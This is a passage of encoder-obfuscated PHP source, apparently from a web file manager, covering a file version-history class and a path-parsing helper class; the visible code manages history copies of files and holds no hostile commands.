$ü™öã±‘ = $—ß¨ø¹•->getPathOuter($œ«µÀä¼); $Ìïş÷Ûá = self::parsePath($ü™öã±‘); if (!$Ìïş÷Ûá) { return; } self::add($Ìïş÷Ûá); } public static function eventBeforeRename($§Éëõ«) { $²ó½ £³ =& $_SERVER[ĞÆÏ¡Îª]; $óÙ‚í®¥ = self::parsePath($§Éëõ«[0]); if (!$óÙ‚í®¥) { return; } $Çä‹ŒÅŒ = self::checkInHistory($óÙ‚í®¥); if (!$Çä‹ŒÅŒ) { return; } if ($Çä‹ŒÅŒ[$²ó½ £³[33]] == $²ó½ £³[199]) { $×¢Ï”ÇŠ = self::listData($óÙ‚í®¥); if ($×¢Ï”ÇŠ && $×¢Ï”ÇŠ[$²ó½ £³[378]]) { self::moveHistory($óÙ‚í®¥, $§Éëõ«[1]); } } else { IO::rename($Çä‹ŒÅŒ[$²ó½ £³[84]], $§Éëõ«[1]); } } public static function eventBeforeMove($‚©“ßî) { $¬™Ğ§‹¤ =& $_SERVER[ĞÆÏ¡Îª]; $„Ø©õßğ = self::parsePath($‚©“ßî[0]); if (!$„Ø©õßğ) { return; } $ÑÍîÊ³ñ = self::parsePath($‚©“ßî[1]); if (!$ÑÍîÊ³ñ) { return; } $ĞË¤‘®˜ = $‚©“ßî[3]; $íÙ…Íë = self::checkInHistory($„Ø©õßğ); if (!$íÙ…Íë) { return; } $ë¸°´¼ã = self::pathHistory($ÑÍîÊ³ñ); if ($íÙ…Íë[$¬™Ğ§‹¤[33]] == $¬™Ğ§‹¤[199]) { $˜¸«³ã = self::listData($„Ø©õßğ); $¤ûÑÔµÂ = rtrim($ÑÍîÊ³ñ, $¬™Ğ§‹¤[8]) . $¬™Ğ§‹¤[8] . ($ĞË¤‘®˜ ? $ĞË¤‘®˜ : get_path_this($„Ø©õßğ)); $ÑïÖ‹ú› = self::listData($¤ûÑÔµÂ); if ($˜¸«³ã && $˜¸«³ã[$¬™Ğ§‹¤[378]] && $ÑïÖ‹ú› && $ÑïÖ‹ú›[$¬™Ğ§‹¤[378]]) { return self::clear($„Ø©õßğ); } if ($˜¸«³ã && $˜¸«³ã[$¬™Ğ§‹¤[378]]) { self::moveHistory($„Ø©õßğ, $ĞË¤‘®˜, $ë¸°´¼ã); } } else { IO::move($íÙ…Íë[$¬™Ğ§‹¤[84]], $ë¸°´¼ã, !1, $ĞË¤‘®˜); self::clearEmptyFolder(IO::pathFather($íÙ…Íë[$¬™Ğ§‹¤[84]])); } } public static function eventAfterRemove($óÉÊÜÇ¸, $¤ìÅ•©½) { $ÖüíºÎÊ =& $_SERVER[ĞÆÏ¡Îª]; if (!$¤ìÅ•©½) { return; } $Åç€ıÂ = self::parsePath($óÉÊÜÇ¸[0]); if (!$Åç€ıÂ) { return; } $æÏò­™æ = self::checkInHistory($Åç€ıÂ); if (!$æÏò­™æ) { return; } if ($æÏò­™æ[$ÖüíºÎÊ[33]] == $ÖüíºÎÊ[199]) { $ÔéÕ»—À = self::listData($Åç€ıÂ, !1); if ($ÔéÕ»—À && $ÔéÕ»—À[$ÖüíºÎÊ[378]]) { self::clear($Åç€ıÂ, !1); } } else { IO::remove($æÏò­™æ[$ÖüíºÎÊ[84]]); self::clearEmptyFolder(IO::pathFather($æÏò­™æ[$ÖüíºÎÊ[84]])); } } private static function checkInHistory($òÓìé«Á) { $±ßÂºÇó = self::pathHistory($òÓìé«Á); if (!IO::exist($±ßÂºÇó)) { $±ßÂºÇó .= $_SERVER[ĞÆÏ¡Îª][1214]; } return IO::exist($±ßÂºÇó) ? IO::info($±ßÂºÇó) : !1; } private static function parsePath($Ãœš”Àú) { $ ‹È´µ =& $_SERVER[ĞÆÏ¡Îª]; if (!$Ãœš”Àú) { return !1; } if ($GLOBALS[$ ‹È´µ[1215]]) { return; } $™¼˜òÎ = KodIO::parse($Ãœš”Àú); $Ç¯Úöİ¢ = $™¼˜òÎ[$ ‹È´µ[33]]; $†»©áÖ = !$Ç¯Úöİ¢ || $Ç¯Úöİ¢ == KodIO::KOD_IO || $Ç¯Úöİ¢ == KodIO::KOD_SHARE_ITEM; if (!$†»©áÖ || !$™¼˜òÎ[$ ‹È´µ[1216]]) { return !1; } if (substr($Ãœš”Àú, 0, strlen(DATA_PATH . $ ‹È´µ[1217])) == DATA_PATH . $ ‹È´µ[1217]) { return !1; } if ($Ç¯Úöİ¢ == KodIO::KOD_SHARE_ITEM) { $°£Ï¸˜” = IO::init($Ãœš”Àú); if ($°£Ï¸˜”->pathParse[$ ‹È´µ[1142]]) { return self::parsePath($°£Ï¸˜”->pathParse[$ ‹È´µ[1142]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $Æ“°Ë¿™ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $ ‹È´µ[1218]); foreach ($Æ“°Ë¿™ as $Ñºêõš™) { if (!$Ç¯Úöİ¢ && substr($Ãœš”Àú, 0, strlen($Ñºêõš™)) == $Ñºêõš™) { return !1; } } self::log($GLOBALS[$ ‹È´µ[1137]] . $ ‹È´µ[1219] . $Ãœš”Àú); return $Ãœš”Àú; } private static function pathHistory($®Ÿ¥×ˆ) { $Ñ„è¾½Å =& $_SERVER[ĞÆÏ¡Îª]; $œÌõ•»‡ = self::$_historyBase . ltrim(KodIO::clear($®Ÿ¥×ˆ), $Ñ„è¾½Å[8]); $œÌõ•»‡ = str_replace(array($Ñ„è¾½Å[1220]), array($Ñ„è¾½Å[1221]), $œÌõ•»‡); return $œÌõ•»‡; } public static function log($Ùšú„•Ş) { } public static function historyCount($„Ã”‡ë“) { $ºµÓïùÜ =& $_SERVER[ĞÆÏ¡Îª]; $äÙùŒèî = array(); $ğ»ŞìäŸ = array(); foreach ($„Ã”‡ë“ as $ö¨Ø‰ìË) { $ÆÎÓáã· = get_path_father($ö¨Ø‰ìË); if (!$ğ»ŞìäŸ[$ÆÎÓáã·]) { $ğ»ŞìäŸ[$ÆÎÓáã·] = array(); } $ğ»ŞìäŸ[$ÆÎÓáã·][] = get_path_this($ö¨Ø‰ìË); } foreach ($ğ»ŞìäŸ as $ÆÎÓáã· => $»¸®Ó«‡) { $°€ûê—ò = self::parsePath($ÆÎÓáã·); if (!$°€ûê—ò) { continue; } foreach ($»¸®Ó«‡ as $âÛ›ã¨æ) { $°ù²‹Õâ = self::listData(rtrim($°€ûê—ò, $ºµÓïùÜ[8]) . $ºµÓïùÜ[8] . $âÛ›ã¨æ, !1); if ($°ù²‹Õâ && $°ù²‹Õâ[$ºµÓïùÜ[378]]) { $äÙùŒèî[rtrim($ÆÎÓáã·, $ºµÓïùÜ[8]) . $ºµÓïùÜ[8] . $âÛ›ã¨æ] = count($°ù²‹Õâ[$ºµÓïùÜ[378]]); } } } return $äÙùŒèî; } public static function add($û¤Ø¢±Ï) { $ƒä‰Ú¼® =& $_SERVER[ĞÆÏ¡Îª]; $Ë·ËñÁ² = self::listData($û¤Ø¢±Ï); if (!$Ë·ËñÁ²) { return; } $Îª±ˆğæ = Model($ƒä‰Ú¼®[765])->get($ƒä‰Ú¼®[1222]); $ÓÏ¯¦Ó² = $GLOBALS[$ƒä‰Ú¼®[6]][$ƒä‰Ú¼®[89]][$ƒä‰Ú¼®[1200]]; $âò®š€ = $Îª±ˆğæ == $ƒä‰Ú¼®[1223] ? min(5, $ÓÏ¯¦Ó²) : $ÓÏ¯¦Ó²; if ($ÓÏ¯¦Ó² <= 0) { return; } $•÷¶ ¼Ş = IO::info($û¤Ø¢±Ï); $á²ÛûÓå = $Ë·ËñÁ²[$ƒä‰Ú¼®[378]]; if ($•÷¶ ¼Ş[$ƒä‰Ú¼®[76]] == 0) { return; } if ($•÷¶ ¼Ş[$ƒä‰Ú¼®[76]] >= 1024 * 1024 * 500) { return !1; } $Õ„¦ã• = IO::hashSimple($û¤Ø¢±Ï); if ($á²ÛûÓå && $á²ÛûÓå[0][$ƒä‰Ú¼®[177]] == $Õ„¦ã•) { return !0; } if (array_key_exists($ƒä‰Ú¼®[202], $•÷¶ ¼Ş) && !$•÷¶ ¼Ş[$ƒä‰Ú¼®[202]]) { return !1; } $»Ã¹ÆĞı = short_id(time()); $Œ¯ûÔ–ç = array($ƒä‰Ú¼®[407] => $»Ã¹ÆĞı, $ƒä‰Ú¼®[177] => $Õ„¦ã•, $ƒä‰Ú¼®[32] => $•÷¶ ¼Ş[$ƒä‰Ú¼®[32]] . $ƒä‰Ú¼®[10] . date($ƒä‰Ú¼®[1224]) . rand_string(1), $ƒä‰Ú¼®[76] => $•÷¶ ¼Ş[$ƒä‰Ú¼®[76]], $ƒä‰Ú¼®[463] => USER_ID, $ƒä‰Ú¼®[200] => time(), $ƒä‰Ú¼®[1225] => $ƒä‰Ú¼®[12]); IO::mkdir($Ë·ËñÁ²[$ƒä‰Ú¼®[1226]]); $ß§¸òæŒ = IO::copy($û¤Ø¢±Ï, $Ë·ËñÁ²[$ƒä‰Ú¼®[1226]], !1, $Œ¯ûÔ–ç[$ƒä‰Ú¼®[32]]); if (!$ß§¸òæŒ) { self::clearEmptyFolder($Ë·ËñÁ²[$ƒä‰Ú¼®[1226]]); return !1; } array_unshift($á²ÛûÓå, $Œ¯ûÔ–ç); if (count($á²ÛûÓå) > $âò®š€) { $¤—ÙıÔŠ = array_slice($á²ÛûÓå, $âò®š€); foreach ($¤—ÙıÔŠ as $ŒùŞÑñ) { IO::remove($Ë·ËñÁ²[$ƒä‰Ú¼®[1226]] . $ŒùŞÑñ[$ƒä‰Ú¼®[32]]); } $á²ÛûÓå = array_slice($á²ÛûÓå, 0, $âò®š€); } return self::saveData($Ë·ËñÁ²[$ƒä‰Ú¼®[1227]], $á²ÛûÓå); } public static function remove($Ùˆ¥ÉÃ¸, $“¡ú‘¥») { $¤¬Ëòá =& $_SERVER[ĞÆÏ¡Îª]; $ÖóÒ¨ = self::listData($Ùˆ¥ÉÃ¸); $Ñôæ‰Œ = array(); if (!$ÖóÒ¨) { return !1; } foreach ($ÖóÒ¨[$¤¬Ëòá[378]] as $¢°’ÒÓª) { if ($¢°’ÒÓª[$¤¬Ëòá[407]] == $“¡ú‘¥») { IO::remove($ÖóÒ¨[$¤¬Ëòá[1226]] . $¢°’ÒÓª[$¤¬Ëòá[32]]); continue; } $Ñôæ‰Œ[] = $¢°’ÒÓª; } return self::saveData($ÖóÒ¨[$¤¬Ëòá[1227]], $Ñôæ‰Œ); } public static function clear($ÍŒÇÌâí, $Û÷´ƒïó = true) { $ñŒ‘¬éù =& $_SERVER[ĞÆÏ¡Îª]; $­ºèş³ = self::listData($ÍŒÇÌâí, $Û÷´ƒïó); if (!$­ºèş³) { return !1; } foreach ($­ºèş³[$ñŒ‘¬éù[378]] as $ô™ñ¢À) { IO::remove($­ºèş³[$ñŒ‘¬éù[1226]] . $ô™ñ¢À[$ñŒ‘¬éù[32]]); } return self::saveData($­ºèş³[$ñŒ‘¬éù[1227]], array()); } public static function moveHistory($ı…Ëşš®, $Ø»†©ñ¶ = '', $›Ø¸Ë¬ = '') { $÷õ’åı =& $_SERVER[ĞÆÏ¡Îª]; $ÔÒƒ‡õ = self::listData($ı…Ëşš®, !1); if (!$ÔÒƒ‡õ || !$ÔÒƒ‡õ[$÷õ’åı[378]]) { return !1; } $ÙÅŸ—äû = $÷õ’åı[1214]; $Ø»†©ñ¶ = $Ø»†©ñ¶ ? $Ø»†©ñ¶ : get_path_this($ı…Ëşš®); $›Ø¸Ë¬ = $›Ø¸Ë¬ ? $›Ø¸Ë¬ : $ÔÒƒ‡õ[$÷õ’åı[1226]]; $¼ğÙŠêá = substr(get_path_this($ÔÒƒ‡õ[$÷õ’åı[1227]]), 0, -strlen($ÙÅŸ—äû)); foreach ($ÔÒƒ‡õ[$÷õ’åı[378]] as $‡¹‘¬¡ƒ => $›µ™û³Ô) { $çô‡ª†Ü = $Ø»†©ñ¶ . substr($›µ™û³Ô[$÷õ’åı[32]], strlen($¼ğÙŠêá)); $ˆôÆ‚ïŸ = IO::move($ÔÒƒ‡õ[$÷õ’åı[1226]] . $›µ™û³Ô[$÷õ’åı[32]], $›Ø¸Ë¬, !1, $çô‡ª†Ü); if ($ˆôÆ‚ïŸ) { $ÔÒƒ‡õ[$÷õ’åı[378]][$‡¹‘¬¡ƒ][$÷õ’åı[32]] = $çô‡ª†Ü; } } $ÔÒƒ‡õ[$÷õ’åı[1227]] = IO::move($ÔÒƒ‡õ[$÷õ’åı[1227]], $›Ø¸Ë¬, !1, $Ø»†©ñ¶ . $ÙÅŸ—äû); self::saveData($ÔÒƒ‡õ[$÷õ’åı[1227]], $ÔÒƒ‡õ[$÷õ’åı[378]]); self::clearEmptyFolder($ÔÒƒ‡õ[$÷õ’åı[1226]]); } public static function rollback($®êõ™Ş½, $Í¿ıˆ´Ã) { $¿¡ÏºÃ‡ =& $_SERVER[ĞÆÏ¡Îª]; $£èí£õ = self::listData($®êõ™Ş½); if (!$£èí£õ) { return; } $Í½­´ÆÚ = IO::info($®êõ™Ş½); foreach ($£èí£õ[$¿¡ÏºÃ‡[378]] as $ç€­İ–Æ => $œäÕ³Ìª) { if ($œäÕ³Ìª[$¿¡ÏºÃ‡[407]] == $Í¿ıˆ´Ã) { self::add($®êõ™Ş½); $×æ˜ãÙ¨ = $£èí£õ[$¿¡ÏºÃ‡[1226]] . $œäÕ³Ìª[$¿¡ÏºÃ‡[32]]; $Êæé’õ = IO::copy($×æ˜ãÙ¨, IO::pathFather($®êõ™Ş½), REPEAT_REPLACE, $Í½­´ÆÚ[$¿¡ÏºÃ‡[32]]); if ($Êæé’õ) { self::remove($®êõ™Ş½, $Í¿ıˆ´Ã); } return $Êæé’õ; } } return !1; } public static function setDetail($ú¬Âá–, $™„Û¢½º, $ş†Ó”‡Ö) { $æ²Ùã…Â =& $_SERVER[ĞÆÏ¡Îª]; $»Àûá’ = self::listData($ú¬Âá–); if (!$»Àûá’) { return; } foreach ($»Àûá’[$æ²Ùã…Â[378]] as $§»¹œƒ… => $¥’­¢ûá) { if ($¥’­¢ûá[$æ²Ùã…Â[407]] == $™„Û¢½º) { $»Àûá’[$æ²Ùã…Â[378]][$§»¹œƒ…][$æ²Ùã…Â[1225]] = $ş†Ó”‡Ö; self::saveData($»Àûá’[$æ²Ùã…Â[1227]], $»Àûá’[$æ²Ùã…Â[378]]); return !0; } } return !1; } public static function fileInfo($´¡º£Õ, $˜¯Çµ¨š) { $Íâ¨³¤ü =& $_SERVER[ĞÆÏ¡Îª]; $„®Õıà‘ = self::listData($´¡º£Õ); if (!$„®Õıà‘) { show_json(LNG($Íâ¨³¤ü[105]), !1); } $øˆœ¨‘˜ = $Íâ¨³¤ü[12]; foreach ($„®Õıà‘[$Íâ¨³¤ü[378]] as $®®íÍÚÅ => $ùŞ«€Ó) { if ($ùŞ«€Ó[$Íâ¨³¤ü[407]] != $˜¯Çµ¨š) { continue; } $øˆœ¨‘˜ = $„®Õıà‘[$Íâ¨³¤ü[1226]] . $ùŞ«€Ó[$Íâ¨³¤ü[32]]; break; } if (!$øˆœ¨‘˜) { show_json(LNG($Íâ¨³¤ü[105]), !1); } return IO::info($øˆœ¨‘˜); } public static function fileOut($ÙñÁÂ½Œ, $·€üüÎÕ, $ºÕµ„¡Ä = false) { $Ñùâ™ç =& $_SERVER[ĞÆÏ¡Îª]; $‘ÌñÈ„ = self::fileInfo($ÙñÁÂ½Œ, $·€üüÎÕ); $óÙ¬ÌßĞ =& $GLOBALS[$Ñùâ™ç[7]]; $ºÕµ„¡Ä = isset($óÙ¬ÌßĞ[$Ñùâ™ç[1190]]) && $óÙ¬ÌßĞ[$Ñùâ™ç[1190]] == 1; if (isset($óÙ¬ÌßĞ[$Ñùâ™ç[33]]) && $óÙ¬ÌßĞ[$Ñùâ™ç[33]] == $Ñùâ™ç[1228]) { return IO::fileOutImage($‘ÌñÈ„[$Ñùâ™ç[84]], $óÙ¬ÌßĞ[$Ñùâ™ç[1229]]); } IO::fileOut($‘ÌñÈ„[$Ñùâ™ç[84]], $ºÕµ„¡Ä, get_path_this($ÙñÁÂ½Œ)); } public static function listData($íà­Ù¢“, $‰¼‘Ö™ = true) { $†ÊÜ”ı° =& $_SERVER[ĞÆÏ¡Îª]; if ($‰¼‘Ö™ && !IO::exist($íà­Ù¢“)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($íà­Ù¢“, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $‡ş¾ò‘ã = self::pathHistory($íà­Ù¢“); $†®äî–Ù = array($†ÊÜ”ı°[1227] => $‡ş¾ò‘ã . $†ÊÜ”ı°[1214], $†ÊÜ”ı°[1226] => rtrim(get_path_father($‡ş¾ò‘ã), $†ÊÜ”ı°[8]) . $†ÊÜ”ı°[8], $†ÊÜ”ı°[378] => array()); $·é¤şØ = IO::getContent($†®äî–Ù[$†ÊÜ”ı°[1227]]); if ($·é¤şØ) { $Öáö¿ˆ = json_decode($·é¤şØ, !0); if (is_array($Öáö¿ˆ)) { $†®äî–Ù[$†ÊÜ”ı°[378]] = $Öáö¿ˆ; } } return $†®äî–Ù; } private static function saveData($í£şé©³, $àäÓ€¹) { $·Ñƒ£¹İ =& $_SERVER[ĞÆÏ¡Îª]; self::log($·Ñƒ£¹İ[1230] . $í£şé©³ . $·Ñƒ£¹İ[71] . count($àäÓ€¹), $·Ñƒ£¹İ[747]); if ($àäÓ€¹) { return IO::setContent($í£şé©³, json_encode($àäÓ€¹)); } $âê Â€Ö = IO::pathFather($í£şé©³); IO::remove($í£şé©³); self::clearEmptyFolder($âê Â€Ö); return !0; } public static function clearEmptyFolder($ÃòÂ‡Åû) { $Éæß¾Î´ =& $_SERVER[ĞÆÏ¡Îª]; if (trim($ÃòÂ‡Åû, $Éæß¾Î´[8]) == trim(self::$_historyBase, $Éæß¾Î´[8])) { return; } $’¢ï³Äú = IO::pathFather($ÃòÂ‡Åû); $«ëØ°ü  = IO::has($ÃòÂ‡Åû, !0); if ($«ëØ°ü [$Éæß¾Î´[207]] > 0 || $«ëØ°ü [$Éæß¾Î´[208]] > 0) { return; } IO::remove($ÃòÂ‡Åû); self::clearEmptyFolder($’¢ï³Äú); } private static function getBasePath() { $”’»Œ· =& $_SERVER[ĞÆÏ¡Îª]; $§Ä¡¶ = Model($”’»Œ·[1231])->get($”’»Œ·[1232]); if ($§Ä¡¶) { if (!IO::exist($§Ä¡¶)) { IO::mkdir($§Ä¡¶); } if (get_path_this($§Ä¡¶) == $”’»Œ·[1217]) { $¼¡Æõ° = $”’»Œ·[1233] . rand_string(8); @rename($§Ä¡¶, get_path_father($§Ä¡¶) . $”’»Œ·[8] . $¼¡Æõ°); $§Ä¡¶ = DATA_PATH . $¼¡Æõ° . $”’»Œ·[8]; file_put_contents(DATA_PATH . $”’»Œ·[1234], $”’»Œ·[12]); Model($”’»Œ·[1231])->set($”’»Œ·[1232], $§Ä¡¶); } return $§Ä¡¶; } $§Ä¡¶ = DATA_PATH . $”’»Œ·[1233] . rand_string(8) . $”’»Œ·[8]; $§Ä¡¶ = IO::mkdir($§Ä¡¶); $§Ä¡¶ = rtrim($§Ä¡¶, $”’»Œ·[8]) . $”’»Œ·[8]; file_put_contents($§Ä¡¶ . $”’»Œ·[1234], $”’»Œ·[12]); file_put_contents(DATA_PATH . $”’»Œ·[1234], $”’»Œ·[12]); Model($”’»Œ·[1231])->set($”’»Œ·[1232], $§Ä¡¶); return $§Ä¡¶; } } class KodIO { const KOD_SOURCE = "\173\x73\x6f\165\x72\143\145\x7d"; const KOD_USER_RECYCLE = "\173\x75\163\145\162\122\145\x63\x79\143\x6c\145\x7d"; const KOD_USER_FAV = "\x7b\165\163\x65\162\106\x61\x76\175"; const KOD_USER_FILE_TAG = "\x7b\x75\x73\x65\x72\106\x69\x6c\145\124\x61\x67\175"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\145\162\x46\151\x6c\145\124\x79\x70\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\147\x72\157\165\x70\x52\x6f\x6f\164\123\x65\154\x66\x7d"; const KOD_USER_SHARE = "\x7b\165\x73\145\x72\123\150\141\162\x65\175"; const KOD_USER_SHARE_LINK = "\173\165\x73\x65\162\x53\150\x61\x72\x65\x4c\151\156\153\x7d"; const KOD_USER_SHARE_TO_ME = "\173\x73\150\x61\162\145\124\157\115\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\163\x68\x61\162\145\x49\164\x65\x6d\x7d"; const KOD_SHARE_LINK = "\x7b\163\150\141\x72\x65\111\x74\145\x6d\114\151\x6e\x6b\x7d"; const KOD_SEARCH = "\173\163\145\141\162\143\x68\175"; const KOD_BLOCK = "\173\x62\154\x6f\x63\x6b\175"; const KOD_IO = "\173\x69\157\x7d"; const KOD_USER_RECENT = "\173\x75\163\145\162\x52\x65\156\x63\145\156\164\x7d"; const KOD_USER_DRIVER = "\173\144\x72\x69\x76\x65\162\x7d"; public static function typeList() { $¹¥æ´çÎ =& $_SERVER[ĞÆÏ¡Îª]; return array($¹¥æ´çÎ[1235] => self::KOD_SOURCE, $¹¥æ´çÎ[1236] => self::KOD_USER_RECYCLE, $¹¥æ´çÎ[1237] => self::KOD_USER_FAV, $¹¥æ´çÎ[1238] => self::KOD_USER_FILE_TAG, $¹¥æ´çÎ[1239] => self::KOD_USER_FILE_TYPE, $¹¥æ´çÎ[1240] => self::KOD_GROUP_ROOT_SELF, $¹¥æ´çÎ[1241] => self::KOD_USER_SHARE, $¹¥æ´çÎ[1242] => self::KOD_USER_SHARE_LINK, $¹¥æ´çÎ[1243] => self::KOD_USER_SHARE_TO_ME, $¹¥æ´çÎ[1244] => self::KOD_SHARE_ITEM, $¹¥æ´çÎ[1245] => self::KOD_SHARE_LINK, $¹¥æ´çÎ[1246] => self::KOD_SEARCH, $¹¥æ´çÎ[1247] => self::KOD_BLOCK, $¹¥æ´çÎ[1248] => self::KOD_IO, $¹¥æ´çÎ[1249] => self::KOD_USER_RECENT, $¹¥æ´çÎ[1250] => self::KOD_USER_DRIVER); } public static function parse($ïŞƒ—) { $Çò£§¬¼ =& $_SERVER[ĞÆÏ¡Îª]; $ïŞƒ— = self::clear($ïŞƒ—); $’Šç“œÂ = array_values(self::typeList()); preg_match($Çò£§¬¼[1251], $ïŞƒ—, $óœ–Ô€†); $’»¥ ø¼ = array($Çò£§¬¼[431] => !1, $Çò£§¬¼[1252] => !1, $Çò£§¬¼[428] => !1, $Çò£§¬¼[84] => $ïŞƒ—, $Çò£§¬¼[1161] => !1, $Çò£§¬¼[1160] => $Çò£§¬¼[12]); if (is_array($óœ–Ô€†) && count($óœ–Ô€†) == 5) { $åïŠ‘¬ = $Çò£§¬¼[1253] . $óœ–Ô€†[2] . $Çò£§¬¼[336]; if (in_array($åïŠ‘¬, $’Šç“œÂ)) { $’»¥ ø¼[$Çò£§¬¼[1161]] = $óœ–Ô€†[1]; $’»¥ ø¼[$Çò£§¬¼[33]] = $åïŠ‘¬; $’»¥ ø¼[$Çò£§¬¼[1254]] = substr($åïŠ‘¬, 1, -1); $’»¥ ø¼[$Çò£§¬¼[407]] = $óœ–Ô€†[3]; } $’»¥ ø¼[$Çò£§¬¼[1160]] = $óœ–Ô€†[4]; } $ƒİ»ğ = array($Çò£§¬¼[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $’»¥ ø¼[$Çò£§¬¼[1216]] = in_array($’»¥ ø¼[$Çò£§¬¼[33]], $ƒİ»ğ); return $’»¥ ø¼; } public static function isTruePath($²ŸİÔ§£) { $¦ÆôïÁş =& $_SERVER[ĞÆÏ¡Îª]; if (substr($²ŸİÔ§£, 0, 1) != $¦ÆôïÁş[1253]) { return !0; } if (strpos($²ŸİÔ§£, $¦ÆôïÁş[417]) === 0) { return !0; } if (strpos($²ŸİÔ§£, $¦ÆôïÁş[1220]) === 0) { return !0; } if (strpos($²ŸİÔ§£, $¦ÆôïÁş[1255]) === 0) { return !0; } if (strpos($²ŸİÔ§£, $¦ÆôïÁş[1256]) === 0) { return !0; } if (strpos($²ŸİÔ§£, $¦ÆôïÁş[1257]) === 0) { return !0; } return !1; } public static function clear($„¹Ğì‰Æ) { $‰‚Ëöš× =& $_SERVER[ĞÆÏ¡Îª]; $„¹Ğì‰Æ = str_replace(array($‰‚Ëöš×[1069], $‰‚Ëöš×[231]), $‰‚Ëöš×[53], $„¹Ğì‰Æ); $„¹Ğì‰Æ = str_replace($‰‚Ëöš×[97], $‰‚Ëöš×[8], $„¹Ğì‰Æ); $êˆ¬øÀÏ = $‰‚Ëöš×[1258]; if (substr($„¹Ğì‰Æ, 0, 3) == $‰‚Ëöš×[1259]) { $„¹Ğì‰Æ = substr($„¹Ğì‰Æ, 3); } while (strstr($„¹Ğì‰Æ, $êˆ¬øÀÏ)) { $„¹Ğì‰Æ = str_replace($êˆ¬øÀÏ, $‰‚Ëöš×[8], $„¹Ğì‰Æ); } $„¹Ğì‰Æ = preg_replace($‰‚Ëöš×[1260], $‰‚Ëöš×[8], $„¹Ğì‰Æ); if ($„¹Ğì‰Æ == $‰‚Ëöš×[8]) { return $‰‚Ëöš×[8]; } $„¹Ğì‰Æ = rtrim($„¹Ğì‰Æ, $‰‚Ëöš×[8]); return $„¹Ğì‰Æ; } public static function sourceID($ßÜø×òÔ) { $›û½Æ¥€ =& $_SERVER[ĞÆÏ¡Îª]; $ Ò•æµ = self::parse($ßÜø×òÔ); if ($ Ò•æµ[$›û½Æ¥€[33]] !== self::KOD_SOURCE) { show_json(LNG($›û½Æ¥€[1261]), !1); } return $ Ò•æµ[$›û½Æ¥€[407]]; } public static function make($†ïú¼“˜) { if (!$†ïú¼“˜) { return !1; } return self::makePath(self::KOD_SOURCE, intval($†ïú¼“˜)); } public static function makeShare($òÉœĞ Û, $›šÚ™Œã) { return self::makePath(self::KOD_SHARE_ITEM, $òÉœĞ Û, $›šÚ™Œã); } public static function makeFileTypePath($“É‡èœè) { return self::makePath(self::KOD_USER_FILE_TYPE, $“É‡èœè); } public static function makeFileTagPath($÷á„ü¸ğ) { return self::makePath(self::KOD_USER_FILE_TAG, $÷á„ü¸ğ); } public static function makePath($¥œ¦‚³ , $ĞŠ¡…”£ = '', $ÌªÙÒşç = '') { $‚éçº’‹ =& $_SERVER[ĞÆÏ¡Îª]; $‚È²¤¿ã = substr($¥œ¦‚³ , 1, -1); $òœş‹Ÿı = $‚éçº’‹[1262] . $‚È²¤¿ã . $‚éçº’‹[1263] . $ĞŠ¡…”£ . $‚éçº’‹[1264]; $òœş‹Ÿı = $ÌªÙÒşç ? $òœş‹Ÿı . $ÌªÙÒşç . $‚éçº’‹[8] : $òœş‹Ÿı; return $òœş‹Ÿı; } public static function hashPath($™Ô‘½Ñ, $òúçö­ç = true) { $ãÃû©˜ =& $_SERVER[ĞÆÏ¡Îª]; $‹Üı¢±ë = is_array($™Ô‘½Ñ) ? $™Ô‘½Ñ : IO::info($™Ô‘½Ñ); $–ÖßÑš = _get($‹Üı¢±ë, $ãÃû©˜[1265], $ãÃû©˜[12]); if (!$–ÖßÑš && isset($‹Üı¢±ë[$ãÃû©˜[411]])) { $‹Üı¢±ë = IO::info(KodIO::make($‹Üı¢±ë[$ãÃû©˜[411]])); $–ÖßÑš = _get($‹Üı¢±ë, $ãÃû©˜[1265], $ãÃû©˜[12]); } if (!$–ÖßÑš && $òúçö­ç) { $ÁÜà•• = KodIO::parse($‹Üı¢±ë[$ãÃû©˜[84]]); if (!$ÁÜà••[$ãÃû©˜[33]]) { $–ÖßÑš = IO::hashSimple($‹Üı¢±ë[$ãÃû©˜[84]]); } } if (!$–ÖßÑš) { $–ÖßÑš = md5($‹Üı¢±ë[$ãÃû©˜[84]] . $‹Üı¢±ë[$ãÃû©˜[76]] . $‹Üı¢±ë[$ãÃû©˜[85]]); } return $–ÖßÑš; } public static function initSystemPath() { $Ø»¢İÙĞ =& $_SERVER[ĞÆÏ¡Îª]; if (defined($Ø»¢İÙĞ[1266])) { return; } define($Ø»¢İÙĞ[1266], self::systemPath($Ø»¢İÙĞ[1267])); define($Ø»¢İÙĞ[1268], self::systemPath($Ø»¢İÙĞ[1269])); define($Ø»¢İÙĞ[1270], self::systemPath($Ø»¢İÙĞ[1271])); define($Ø»¢İÙĞ[1272], self::systemPath($Ø»¢İÙĞ[1273])); IOHistory::bindEvent(); } public static function systemPath($“Şõ¾») { $˜ª“®£¸ =& $_SERVER[ĞÆÏ¡Îª]; $ –Å‘ö = $˜ª“®£¸[1274] . ucfirst($“Şõ¾»); $¡Ó¦‚Í = Model($˜ª“®£¸[765])->get($ –Å‘ö); if ($¡Ó¦‚Í) { return $¡Ó¦‚Í; } if ($“Şõ¾» == $˜ª“®£¸[1267]) { $¡Ó¦‚Í = self::make(Model($˜ª“®£¸[820])->systemRootPathAdd($˜ª“®£¸[553])); } else { $¡Ó¦‚Í = self::systemPath($˜ª“®£¸[1267]); $´¹¡ ò = self::sourceID($¡Ó¦‚Í); $¡Ó¦‚Í = self::make(Model($˜ª“®£¸[820])->mkdir($´¹¡ ò, $“Şõ¾»)); } Model($˜ª“®£¸[765])->set($ –Å‘ö, $¡Ó¦‚Í); return $¡Ó¦‚Í; } public static function systemFolder($®…ıÎ®») { $èá°¥âÈ = IO_PATH_SYSTEM_SOURCE . $®…ıÎ®»; $·±§Â— = Cache::get($èá°¥âÈ); if (!$·±§Â—) { $Å¸Æ«´ = IO::infoFull($èá°¥âÈ); if (!$Å¸Æ«´) { $·±§Â— = IO::mkdir($èá°¥âÈ, REPEAT_SKIP); } else { $·±§Â— = $Å¸Æ«´[$_SERVER[ĞÆÏ¡Îª][84]]; } Cache::set($èá°¥âÈ, $·±§Â—, 